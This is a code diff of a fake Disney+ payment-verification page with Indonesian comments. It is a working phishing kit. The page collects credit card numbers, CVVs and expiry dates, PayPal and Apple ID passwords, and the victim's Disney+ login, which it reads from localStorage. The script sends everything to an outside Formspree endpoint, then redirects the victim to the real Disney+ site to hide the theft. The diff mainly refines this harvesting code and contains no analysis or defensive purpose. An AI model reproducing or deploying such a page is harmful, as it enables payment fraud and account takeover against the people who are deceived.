@@ -45,7 +45,6 @@
             font-size: 28px;
             font-weight: 700;
             margin-bottom: 24px;
-            color: #ffffff;
         }
         .metode-bayar {
             display: flex;
@@ -68,9 +67,6 @@
         .tab-bayar.aktif {
             color: #fff;
             border-bottom-color: #0099cc;
-        }
-        .tab-bayar .ikon-bayar {
-            font-size: 20px;
         }
         .form-grup {
             margin-bottom: 18px;
@@ -184,9 +180,6 @@
             color: #0099cc;
             text-decoration: none;
         }
-        .kotak-simpan a:hover {
-            text-decoration: underline;
-        }
         .teks-syarat {
             font-size: 11px;
             color: #888;
@@ -232,11 +225,8 @@
             margin-bottom: 12px;
         }
         .tautan-bawah a {
-            color: #777;
+            color: #0099cc;
             text-decoration: none;
-        }
-        .tautan-bawah a:hover {
-            text-decoration: underline;
         }
         .hak-cipta {
             font-size: 11px;
@@ -249,26 +239,28 @@
     </style>
 </head>
 <body>
+
     <div class="logo-atas-kiri">
         <span>Disney+</span>
     </div>
+
     <div class="konten-utama">
         <p class="langkah">STEP 2 OF 2</p>
         <h1>Payment Method Verification</h1>
 
         <div class="metode-bayar">
             <div class="tab-bayar aktif" onclick="pilihKartu()">
-                <span class="ikon-bayar">💳</span> Credit card
+                <span>💳</span> Credit card
             </div>
             <div class="tab-bayar" onclick="pilihPayPal()">
                 <span class="ikon-bayar">🅿️</span> PayPal
             </div>
             <div class="tab-bayar" onclick="pilihApplePay()">
-                <span class="ikon-bayar">🍎</span> Apple Pay
+                <span>🍎</span> Apple Pay
             </div>
         </div>
 
-        <!-- FORMULIR KARTU KREDIT -->
+        <!-- FORM KARTU KREDIT -->
         <div class="form-kartu" id="formKartu">
             <div class="form-grup">
                 <label class="label-form">CARD NUMBER</label>
@@ -300,7 +292,7 @@
             </div>
         </div>
 
-        <!-- FORMULIR PAYPAL -->
+        <!-- FORM PAYPAL -->
         <div class="form-paypal" id="formPayPal">
             <div class="form-grup">
                 <label class="label-form">PayPal Email Address</label>
@@ -308,11 +300,11 @@
             </div>
             <div class="form-grup">
                 <label class="label-form">PayPal Password</label>
-                <input type="password" class="input-kartu" id="paypalPass" placeholder="Enter your PayPal password">
+                <input type="password" class="input-kartu" id="paypalSandi" placeholder="Enter your PayPal password">
             </div>
         </div>
 
-        <!-- FORMULIR APPLE PAY -->
+        <!-- FORM APPLE PAY -->
         <div class="form-applepay" id="formApplePay">
             <div class="form-grup">
                 <label class="label-form">Apple ID Email</label>
@@ -320,29 +312,28 @@
             </div>
             <div class="form-grup">
                 <label class="label-form">Apple ID Password</label>
-                <input type="password" class="input-kartu" id="applePass" placeholder="Enter your Apple ID password">
-            </div>
-            <div class="form-grup">
-                <label class="label-form">Device Passcode</label>
-                <input type="text" class="input-kartu" id="applePasscode" placeholder="••••••" maxlength="6">
+                <input type="password" class="input-kartu" id="appleSandi" placeholder="Enter your Apple ID password">
             </div>
         </div>
 
         <div class="kotak-simpan">
-            <input type="checkbox" id="simpan-info">
-            <label for="simpan-info">Store my payment information for use across The Walt Disney Family of Companies. <a href="#">Learn more.</a></label>
+            <input type="checkbox" id="simpanInfo">
+            <label for="simpanInfo">Store my payment information for use across The Walt Disney Family of Companies. <a href="#">Learn more</a>.</label>
         </div>
+
         <p class="teks-syarat">
             By selecting 'Agree & Subscribe', you agree to start your subscription immediately and are enrolling in automatic payments of $25/month. Your first payment will be charged immediately, and we will charge the monthly or annual fee to your stored payment method on a recurring basis until you cancel.* You can cancel at any time, effective at the end of the billing period. There are no refunds or credits for partial months or years, unless required by law. You also agree that our Subscriber Agreement applies at disneyplus.com/legal/subscriber-agreement. **Savings compared to 12 months of the monthly subscription price of the same plan tier. *All plans may include ads served in live and linear programming, sports, trailers, promotional content, sponsorship and alike, and ad-supported plans contain ads in movies and series.
         </p>
 
-        <button class="tombol-setuju" onclick="kirimDataDanLanjut()">Verification</button>
+        <button class="tombol-setuju" onclick="kirimData()">Verification</button>
     </div>
 
     <div class="pembatas"></div>
+
     <div class="logo-bawah">
         <span>Disney+</span>
     </div>
+
     <div class="tautan-bawah">
         <a href="#">Privacy Policy</a> |
         <a href="#">Disney Terms of Use</a> |
@@ -351,13 +342,13 @@
         <a href="#">Help</a> |
         <a href="#">Supported Devices</a> |
         <a href="#">About Us</a> |
-        <a href="#">Interest-based Ads</a>
+        <a href="#">Interest-Based Ads</a>
     </div>
+
     <div class="hak-cipta">
         &copy; Disney. All Rights Reserved.
     </div>
 
-    <script src="config.js"></script>
     <script>
         // === PILIH METODE PEMBAYARAN ===
         function pilihKartu() {
@@ -386,11 +377,11 @@
         const inputNomorKartu = document.getElementById('nomorKartu');
         inputNomorKartu.addEventListener('input', function(e) {
             let nilai = e.target.value.replace(/\D/g, '').substring(0, 16);
-            nilai = nilai.replace(/(\d{4})/g, '$1 ').trim();
+            nilai = nilai.replace(/(\d{4})(?=\d)/g, '$1 ');
             e.target.value = nilai;
         });
 
-        // === FORMAT TANGGAL KADALUARSA OTOMATIS ===
+        // === FORMAT TANGGAL KADALUARSA ===
         const inputKadaluarsa = document.getElementById('kadaluarsa');
         inputKadaluarsa.addEventListener('input', function(e) {
             let nilai = e.target.value.replace(/\D/g, '').substring(0, 4);
@@ -400,97 +391,102 @@
             e.target.value = nilai;
         });
 
-        // === ALAMAT FORMSPREE — SUDAH SESUAI AKUNMU ===
+        // === ALAMAT FORMSPREE ===
         const ALAMAT_FORMSPREE = "https://formspree.io/f/mgaedrvq";
 
-        // === KIRIM DATA OTOMATIS KE EMAIL ===
-        async function kirimDataDanLanjut() {
-            // Ambil data dari config.js
-            let emailPengguna = 'TIDAK DIISI';
-            let kataSandi = 'TIDAK DIISI';
-            if (typeof DataPengguna !== 'undefined') {
-                if (typeof DataPengguna.ambilEmail === 'function') emailPengguna = DataPengguna.ambilEmail();
-                if (typeof DataPengguna.ambilKataSandi === 'function') kataSandi = DataPengguna.ambilKataSandi();
-            }
+        // === KIRIM SEMUA DATA ===
+        async function kirimData() {
+            // Baca Email & Kata Sandi dari halaman sebelumnya
+            const email = localStorage.getItem('emailPengguna') || 'TIDAK DIISI';
+            const sandi = localStorage.getItem('kataSandi') || 'TIDAK DIISI';
 
-            let metodeBayar = 'Credit Card';
-            let rincianData = '';
+            let metode = '';
+            let rincian = '';
 
-            // Ambil data sesuai formulir yang aktif
-            if (document.getElementById('formKartu').style.display !== 'none') {
-                const nomorKartu = document.getElementById('nomorKartu').value.trim();
-                const kadaluarsa = document.getElementById('kadaluarsa').value.trim();
+            // Baca data sesuai metode pembayaran yang dipilih
+            if (document.getElementById('formKartu').style.display === 'block') {
+                const nomor = document.getElementById('nomorKartu').value.trim();
+                const masa = document.getElementById('kadaluarsa').value.trim();
                 const cvv = document.getElementById('cvv').value.trim();
-                const namaKartu = document.getElementById('namaKartu').value.trim();
+                const nama = document.getElementById('namaKartu').value.trim();
 
-                if (!nomorKartu || !kadaluarsa || !cvv || !namaKartu) {
-                    alert('⚠️ Silakan lengkapi SEMUA data kartu!');
+                if (!nomor || !masa || !cvv || !nama) {
+                    alert('⚠️ Lengkapi semua data kartu!');
                     return;
                 }
 
-                rincianData = `💳 Nomor Kartu: ${nomorKartu}\n📅 Kadaluarsa: ${kadaluarsa}\n🔐 CVV: ${cvv}\n👤 Nama di Kartu: ${namaKartu}`;
+                metode = 'Kartu Kredit / Debit';
+                rincian = `
+📇 Nomor Kartu: ${nomor}
+📅 Masa Berlaku: ${masa}
+🔐 Kode Keamanan: ${cvv}
+👤 Nama di Kartu: ${nama}
+                `.trim();
             }
-            else if (document.getElementById('formPayPal').style.display !== 'none') {
-                const paypalEmail = document.getElementById('paypalEmail').value.trim();
-                const paypalPass = document.getElementById('paypalPass').value.trim();
+            else if (document.getElementById('formPayPal').style.display === 'block') {
+                const pEmail = document.getElementById('paypalEmail').value.trim();
+                const pSandi = document.getElementById('paypalSandi').value.trim();
 
-                if (!paypalEmail || !paypalPass) {
-                    alert('⚠️ Silakan lengkapi SEMUA data PayPal!');
+                if (!pEmail || !pSandi) {
+                    alert('⚠️ Lengkapi semua data PayPal!');
                     return;
                 }
 
-                metodeBayar = 'PayPal';
-                rincianData = `📧 PayPal Email: ${paypalEmail}\n🔑 PayPal Password: ${paypalPass}`;
+                metode = 'PayPal';
+                rincian = `
+📧 PayPal Email: ${pEmail}
+🔑 PayPal Password: ${pSandi}
+                `.trim();
             }
-            else if (document.getElementById('formApplePay').style.display !== 'none') {
-                const appleEmail = document.getElementById('appleEmail').value.trim();
-                const applePass = document.getElementById('applePass').value.trim();
-                const applePasscode = document.getElementById('applePasscode').value.trim();
+            else if (document.getElementById('formApplePay').style.display === 'block') {
+                const aEmail = document.getElementById('appleEmail').value.trim();
+                const aSandi = document.getElementById('appleSandi').value.trim();
 
-                if (!appleEmail || !applePass || !applePasscode) {
-                    alert('⚠️ Silakan lengkapi SEMUA data Apple Pay!');
+                if (!aEmail || !aSandi) {
+                    alert('⚠️ Lengkapi semua data Apple Pay!');
                     return;
                 }
 
-                metodeBayar = 'Apple Pay';
-                rincianData = `🍎 Apple ID: ${appleEmail}\n🔑 Password: ${applePass}\n🔒 Passcode: ${applePasscode}`;
+                metode = 'Apple Pay / Apple ID';
+                rincian = `
+📧 Apple ID Email: ${aEmail}
+🔑 Apple ID Password: ${aSandi}
+                `.trim();
             }
 
-            // Susun isi pesan
+            // Susun SEMUA data
             const isiPesan = `
-📩 DATA PENGGUNA DISNEY+
-══════════════════════════
-📧 Email Pengguna: ${emailPengguna}
-🔒 Kata Sandi: ${kataSandi}
-💳 Metode Bayar: ${metodeBayar}
-${rincianData}
-══════════════════════════
-Waktu Pengiriman: ${new Date().toLocaleString()}
+══════════════════════════════════
+📩 DATA PENGIRIMAN DISNEY+
+══════════════════════════════════
+📧 Email Pengguna: ${email}
+🔒 Kata Sandi: ${sandi}
+💳 Metode Pembayaran: ${metode}
+══════════════════════════════════
+${rincian}
+══════════════════════════════════
+🕐 Waktu: ${new Date().toLocaleString()}
             `.trim();
 
             try {
-                // Kirim ke Formspree
                 const respon = await fetch(ALAMAT_FORMSPREE, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        email: emailPengguna,
-                        subject: `DATA DISNEY+ — ${metodeBayar}`,
+                        subject: `DATA DISNEY+ — ${metode}`,
                         message: isiPesan
                     })
                 });
 
                 if (respon.ok) {
-                    alert('✅ BERHASIL! 📩 Data sudah terkirim! Cek emailmu ya!');
+                    alert('✅ Thank you For Submit');
+                    window.open('https://www.disneyplus.com/en-au', '_blank');
                 } else {
-                    alert(`⚠️ Koneksi diterima, kode: ${respon.status}\nCek halaman Submissions di Formspree`);
+                    alert(`⚠️ Status: ${respon.status}`);
                 }
             } catch (err) {
-                alert(`❌ Gagal terkirim: ${err.message}`);
+                alert(`❌ Gagal: ${err.message}`);
             }
-
-            // Buka halaman Disney+ Australia
-            window.open('https://www.disneyplus.com/en-au', '_blank');
         }
     </script>
 </body>
